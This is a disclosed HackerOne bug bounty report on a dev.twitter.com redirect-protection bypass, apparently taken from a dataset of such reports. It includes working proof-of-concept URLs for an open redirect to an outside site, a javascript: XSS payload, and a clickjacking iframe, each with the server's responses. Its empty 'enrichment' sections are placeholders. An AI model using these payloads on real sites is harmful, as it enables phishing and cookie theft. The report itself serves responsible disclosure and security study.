---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '330008'
original_report_id: '330008'
title: '[dev.twitter.com] XSS and Open Redirect Protection Bypass'
team_handle: x
created_at: '2018-03-26T14:44:33.635Z'
disclosed_at: '2019-02-07T16:32:13.022Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 44
asset_identifier: '*.twitter.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
---

# [dev.twitter.com] XSS and Open Redirect Protection Bypass

## Metadata

- HackerOne Report ID: 330008
- Weakness: 
- Program: x
- Disclosed At: 2019-02-07T16:32:13.022Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Description:
Hi 
after I finish reading the report https://hackerone.com/reports/260744.i start to test this subdomain.i fount an interesting url [https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/basics/adding-international-support-to-your-apps].this url is special,my intuition tells me that this URL may have a problem.so,i try test,amzing i found a way to bypass protection.

PoC: Open Redirect
https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/http://www.bywalks.com/

HTTP Response:
HTTP/1.1 302 Found
location: http://www.bywalks.com
...
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="http://www.bywalks.com">http://www.bywalks.com</a>.  If not click the link.

PoC: XSS
https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/javascript:alert(1)/

HTTP Response:
HTTP/1.1 302 Found
location: javascript:alert(1)
...
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="javascript:alert(1)">javascript:alert(1)</a>.  If not click the link.

PoC: ClickJacking
<iframe src="https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/http://www.bywalks.com/" sandbox="allow-forms"></iframe>

## Impact

go fishing.steal cookie,etc

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
